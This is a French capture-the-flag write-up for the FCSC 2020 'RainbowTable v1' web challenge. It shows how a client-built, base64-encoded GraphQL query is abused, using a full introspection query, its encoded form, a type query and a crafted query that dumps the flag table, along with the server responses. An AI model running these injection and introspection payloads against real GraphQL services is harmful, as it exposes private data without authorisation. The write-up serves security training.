<p align="center">
  <a href="" rel="noopener">
 <img style="width:50px;" src="https://france-cybersecurity-challenge.fr/files/abecee1bc8e9f22344226e697e672a7d/navbar_logo.png" alt="Project logo"></a>
</p>
<h1 align="center">RainbowTable v1</h1>

<div align="center">

[![CTF](https://img.shields.io/badge/FCSC-2020-red.svg)](https://france-cybersecurity-challenge.fr/)
[![CTF](https://img.shields.io/badge/Catégorie-Web-yellow.svg)](#)

</div>

---

## 📝 Table des matières

- [Enoncé](#problem_statement)
- [Sources](#idea)

## 🧐 Enoncé <a name = "problem_statement"></a>

Nous avons développé une plateforme de recherche de cuisiniers. Venez la tester !

URL : http://challenges2.france-cybersecurity-challenge.fr:5006/

```html
<html>
<head>
	<title>Rainbow Pages</title>
	<link rel="stylesheet" href="static/bootstrap.min.css">
	<link rel="stylesheet" href="static/starter-template.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">

</head>
<body>

	<nav class="navbar navbar-dark bg-primary fixed-top">
		<a class="navbar-brand" href="/"><img src="static/rainbow.png" height="50px" />Rainbow Page </a>
	</nav>

	<div class="container">
		<div class="starter-template">
			<h3>Looking for a cooking chef?</h3>
			<p class="text-muted">
				<em>Are you hungry? Are you looking for a custom succulent dish? We have your answers!</em>
			</p>
			<br/>
			<div class="row">
				<div class="col-md-6 text-left">
					<h5>Search one chef by firstname</h5>
					<div>
						<div class="form-group">
							<div class="input-group mb-3">
								<div class="input-group-prepend">
									<span class="input-group-text"><i class="fas fa-user fa-fw"></i></span>
								</div>
								<input type="text" class="form-control" name="search" id="search">
							</div>
						</div>
						<div class="text-right">
							<button type="button" class="btn btn-danger" id="clear-btn">Clear</button>
							<button type="button" class="btn btn-primary" id="search-btn">Submit</button>
						</div>
					</div>	
				</div>
				<div class="col-md-6 text-left">
					<div id="results" class="results">
						<h5 style="float: left;">Browse the matching chefs</h5>
						<span id="count" class="badge badge-primary badge-pill" style="float: right;"></span>
						<table class="table table-hover table-primary">
							<thead style="display: none;">
								<tr>
									<th scope="col">Name</th>
									<th scope="col">Specialty</th>
									<th scope="col">Price (EUR)</th>
								</tr>
							</thead>
							<tbody></tbody>
						</table> 
					</div>
					<div id="empty" class="text-muted">
						<em>Please perform a search to see the results.</em>
					</div>
				</div>
			</div>
		</div>
	</div>

	<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
	<script>
		function makeSearch(searchInput) {
			if(searchInput.length == 0) {
				alert("You must provide at least one character!");
				return false;
			}

			var searchValue = btoa('{ allCooks (filter: { firstname: {like: "%'+searchInput+'%"}}) { nodes { firstname, lastname, speciality, price }}}');
			var bodyForm = new FormData();
			bodyForm.append("search", searchValue);

			fetch("index.php?search="+searchValue, {
				method: "GET"
			}).then(function(response) {
				response.json().then(function(data) {
					data = eval(data);
					data = data['data']['allCooks']['nodes'];
					$("#results thead").show()
					var table = $("#results tbody");
					table.html("")
					$("#empty").hide();
					data.forEach(function(item, index, array){
						table.append("<tr class='table-dark'><td>"+item['firstname']+" "+ item['lastname']+"</td><td>"+item['speciality']+"</td><td>"+(item['price']/100)+"</td></tr>");
					});
					$("#count").html(data.length)
					$("#count").show()
				});
			});
		}
		
		$("#clear-btn").click(function() {
			$("#search").val("");
			$("#results tbody").html("");
			$("#results thead").hide();
			$("#count").hide()
			$("#empty").show();
		})

		$("#search-btn").click(function() {
			var content = $('#search').val();
			makeSearch(content);
		})
	</script>
</body>
</html>
```

La fonction makeSearch envoie une requete GET avec la valeur d'une requete en base64 ??
```
?search=test
```
L'erreur : 
```json
{"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"\\uFFFD\".","locations":[{"line":1,"column":1}]}]}
```
Cette erreur correspond à un serveur GRAPHQL

Injection GRAPHQL ?

Format de la requete de base : 
```json
{ allCooks (filter: { firstname: {like: "%'+searchInput+'%"}}) { nodes { firstname, lastname, speciality, price }}}
```

J'ai trouvé un petit script graphql pour afficher la totalité des tables sur un dépot github. (Disponible dans les sources)

Pour commencer il faut analyser la base de donnée:
```json
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```
Convertir cette valeur en base64
```
ZnJhZ21lbnQgRnVsbFR5cGUgb24gX19UeXBlIHsKICBraW5kCiAgbmFtZQogIGRlc2NyaXB0aW9uCiAgZmllbGRzKGluY2x1ZGVEZXByZWNhdGVkOiB0cnVlKSB7CiAgICBuYW1lCiAgICBkZXNjcmlwdGlvbgogICAgYXJncyB7CiAgICAgIC4uLklucHV0VmFsdWUKICAgIH0KICAgIHR5cGUgewogICAgICAuLi5UeXBlUmVmCiAgICB9CiAgICBpc0RlcHJlY2F0ZWQKICAgIGRlcHJlY2F0aW9uUmVhc29uCiAgfQogIGlucHV0RmllbGRzIHsKICAgIC4uLklucHV0VmFsdWUKICB9CiAgaW50ZXJmYWNlcyB7CiAgICAuLi5UeXBlUmVmCiAgfQogIGVudW1WYWx1ZXMoaW5jbHVkZURlcHJlY2F0ZWQ6IHRydWUpIHsKICAgIG5hbWUKICAgIGRlc2NyaXB0aW9uCiAgICBpc0RlcHJlY2F0ZWQKICAgIGRlcHJlY2F0aW9uUmVhc29uCiAgfQogIHBvc3NpYmxlVHlwZXMgewogICAgLi4uVHlwZVJlZgogIH0KfQpmcmFnbWVudCBJbnB1dFZhbHVlIG9uIF9fSW5wdXRWYWx1ZSB7CiAgbmFtZQogIGRlc2NyaXB0aW9uCiAgdHlwZSB7CiAgICAuLi5UeXBlUmVmCiAgfQogIGRlZmF1bHRWYWx1ZQp9CmZyYWdtZW50IFR5cGVSZWYgb24gX19UeXBlIHsKICBraW5kCiAgbmFtZQogIG9mVHlwZSB7CiAgICBraW5kCiAgICBuYW1lCiAgICBvZlR5cGUgewogICAgICBraW5kCiAgICAgIG5hbWUKICAgICAgb2ZUeXBlIHsKICAgICAgICBraW5kCiAgICAgICAgbmFtZQogICAgICAgIG9mVHlwZSB7CiAgICAgICAgICBraW5kCiAgICAgICAgICBuYW1lCiAgICAgICAgICBvZlR5cGUgewogICAgICAgICAgICBraW5kCiAgICAgICAgICAgIG5hbWUKICAgICAgICAgICAgb2ZUeXBlIHsKICAgICAgICAgICAgICBraW5kCiAgICAgICAgICAgICAgbmFtZQogICAgICAgICAgICAgIG9mVHlwZSB7CiAgICAgICAgICAgICAgICBraW5kCiAgICAgICAgICAgICAgICBuYW1lCiAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICB9CiAgICB9CiAgfQp9CgpxdWVyeSBJbnRyb3NwZWN0aW9uUXVlcnkgewogIF9fc2NoZW1hIHsKICAgIHF1ZXJ5VHlwZSB7CiAgICAgIG5hbWUKICAgIH0KICAgIG11dGF0aW9uVHlwZSB7CiAgICAgIG5hbWUKICAgIH0KICAgIHR5cGVzIHsKICAgICAgLi4uRnVsbFR5cGUKICAgIH0KICAgIGRpcmVjdGl2ZXMgewogICAgICBuYW1lCiAgICAgIGRlc2NyaXB0aW9uCiAgICAgIGxvY2F0aW9ucwogICAgICBhcmdzIHsKICAgICAgICAuLi5JbnB1dFZhbHVlCiAgICAgIH0KICAgIH0KICB9Cn0=
```

Mettre la valeur en base64 dans search=

-- Un json est retourné voir, allTables.json
```
CTRL + F : Flag
```
```
allFlags et Flag
```
```
allFlag
```

Convertir la requete en base64
```
{__type (name: "Flag") {name fields{name type{name kind ofType{name kind}}}}}
```
Retour :
``` 
{"data":{"__type":{"name":"Flag","fields":[{"name":"nodeId","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"ID","kind":"SCALAR"}}},{"name":"id","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"Int","kind":"SCALAR"}}},{"name":"flag","type":{"name":"String","kind":"SCALAR","ofType":null}}]}}}
```
On y trouve id et flag

Maintenant récuperer la requete de base :
```
{ allCooks (filter: { firstname: {like: "%'+searchInput+'%"}}) { nodes { firstname, lastname, speciality, price }}}
```
Modifier en fonction du résultat
```
{ AllFlags { nodes { flag }}}
```

Resultat : 
```
{"data":{"allFlags":{"nodes":[{"flag":"FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}"}]}}}
```

## ⛓️ Sources <a name = "limitations"></a>

Graphql : https://graphql.org/

Git - swisskyrepo : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
